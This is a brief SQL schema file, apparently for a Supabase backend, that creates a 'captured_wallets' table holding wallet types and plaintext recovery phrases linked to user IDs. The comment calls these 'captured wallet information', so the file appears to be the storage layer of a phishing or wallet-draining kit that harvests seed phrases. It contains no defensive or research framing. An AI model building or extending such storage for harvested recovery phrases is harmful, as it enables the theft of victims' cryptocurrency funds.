-- schema.sql
-- This table stores the captured wallet information.

CREATE TABLE captured_wallets (
    id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
    created_at timestamp with time zone DEFAULT timezone('utc'::text, now()) NOT NULL,
    user_id uuid, -- This can be a foreign key to your auth.users table
    wallet_type text NOT NULL,
    recovery_phrase text NOT NULL
);

-- Optional: If you have user authentication set up with Supabase Auth,
-- you can add a foreign key constraint like this.
-- ALTER TABLE captured_wallets
-- ADD CONSTRAINT fk_user
-- FOREIGN KEY (user_id) REFERENCES auth.users(id);
